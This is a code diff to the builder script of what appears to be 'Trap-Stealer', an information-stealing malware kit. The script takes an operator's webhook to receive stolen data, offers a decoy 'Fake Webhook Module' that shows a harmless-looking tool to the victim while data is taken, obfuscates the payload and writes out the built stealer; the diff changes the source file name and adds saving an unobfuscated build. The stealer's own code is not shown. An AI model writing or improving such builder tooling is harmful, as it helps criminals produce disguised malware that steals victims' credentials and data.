@@ -1,7 +1,7 @@
 import os, platform, subprocess, shutil
 while True:
     os.makedirs('./Build', exist_ok=True)
-    shutil.copy('Trap-Stl.py', './Build/Trap-Stl-Building.py')
+    shutil.copy('main.py', './Build/Trap-Stl-Building.py')
     def clear_console():
         operating_system = platform.system()
         if operating_system == 'Windows':
@@ -21,7 +21,7 @@ while True:
 
 
     # Read the contents of the source file with the appropriate encoding
-    with open('Trap-Stl.py', 'r', encoding='utf-8', errors='replace') as file:
+    with open('main.py', 'r', encoding='utf-8', errors='replace') as file:
         content = file.read()
     Webhook = input('Enter the webhook -> ')
     FakeWeb = get_boolean_input('Do you want to enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
@@ -54,7 +54,11 @@ while True:
             subprocess.run(['python', 'Obfuscator.py', '-r', '-i', './Build/Trap-Stl-Building.py', '-o', './Build/Trap-Stl-Builted-Obf.py', '-s', strength])
             break
         elif Obfuscation in ['n', 'no']:
-            break
+            with open('./Build/Trap-Stealer-Built.py', 'w', encoding='utf-8') as file:
+                file.write(new_content)
+                print('[+] File Created Trap-Stealer-Built.py')
+                input('Press any key to quit...')
+                break
         else:
             print('Invalid input. Please enter Y or N.')
             
